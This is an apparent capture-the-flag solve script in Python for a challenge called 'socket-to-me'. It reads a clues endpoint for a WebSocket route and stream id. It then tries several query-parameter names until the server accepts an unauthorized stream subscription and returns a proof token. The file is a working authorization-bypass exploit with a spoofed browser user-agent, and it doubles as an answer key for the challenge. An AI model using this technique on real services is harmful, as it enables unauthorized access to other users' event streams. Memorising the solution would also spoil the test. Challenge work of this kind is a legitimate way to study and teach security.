#!/usr/bin/env python3
"""web-exploitation-day-22-socket-to-me (release day 27) - this family's own class.

New bug class: unauthorized event-stream subscription via a client-controlled
query parameter on the WebSocket upgrade. `/api/clues` discloses feature_route
(the WS upgrade path) and stream_reference (a numeric id), but connecting
plain (no query, or with the clue's own key name stream_reference/ref) gets a
403 from the app's own upgrade-time role check (current_role: analyst is not
permitted to subscribe at all by default). The upgrade is only accepted when
the query string names the stream with the bare key `stream` (NOT the clue's
own key name `stream_reference`, not `ref`, not `id`) - once that matches, the
server performs the upgrade and immediately pushes one JSON event carrying the
proof, regardless of the disclosed role, because the subscription is never
re-checked against the caller's own role/ownership of that stream reference.

Usage: python3 solve.py <base_url> [evidence_dir]

Requires the `websockets` package (not stdlib) - install into an ephemeral
venv, e.g.:
    uv venv .venv && . .venv/bin/activate && uv pip install websockets certifi
"""
import asyncio
import json
import re
import ssl
import sys
import urllib.request
from pathlib import Path

import certifi
import websockets

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")

# Candidate query-parameter names for the stream reference, evidence-led:
# the clue's own key (stream_reference) and short/common aliases never work;
# the bare word `stream` is the one confirmed live (release day 27).
STREAM_PARAM_CANDIDATES = ("stream", "stream_reference", "ref", "id", "channel")


def get_json(url):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    ctx = ssl.create_default_context(cafile=certifi.where())
    with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
        return json.loads(resp.read().decode())


async def try_stream(ws_base, feature_route, stream_reference, evidence_dir=None):
    ctx = ssl.create_default_context(cafile=certifi.where())
    for param in STREAM_PARAM_CANDIDATES:
        url = f"{ws_base}{feature_route}?{param}={stream_reference}"
        try:
            async with websockets.connect(url, ssl=ctx, open_timeout=10) as ws:
                msg = await asyncio.wait_for(ws.recv(), timeout=10)
                if evidence_dir:
                    (evidence_dir / f"ws_{param}.json").write_text(msg)
                match = PROOF_RE.search(msg)
                if match:
                    return match.group(0), param
        except Exception:
            continue
    return None, None


def rec_unauthorized_event_stream(base_url, evidence_dir=None):
    """Join point for recovery_lib.py: dispatch on clues.get("feature_route") and
    clues.get("stream_reference") is not None (no secondary_route/inventory_route/
    protected_reference/state_format_route/event_type/owner_scope/session_hint/
    callback_nonce alongside it - this shape is otherwise unclaimed)."""
    clues = get_json(base_url.rstrip("/") + "/api/clues")
    feature_route = clues["feature_route"]
    stream_reference = clues["stream_reference"]
    ws_base = "wss://" + base_url.split("://", 1)[1].rstrip("/")
    proof, param = asyncio.run(
        try_stream(ws_base, feature_route, stream_reference, evidence_dir))
    return proof, param, clues


if __name__ == "__main__":
    base = sys.argv[1]
    evdir = Path(sys.argv[2]) if len(sys.argv) > 2 else None
    if evdir:
        evdir.mkdir(parents=True, exist_ok=True)
    proof, param, clues = rec_unauthorized_event_stream(base, evdir)
    print("clues:", clues)
    print("working param:", param)
    print("proof:", proof)
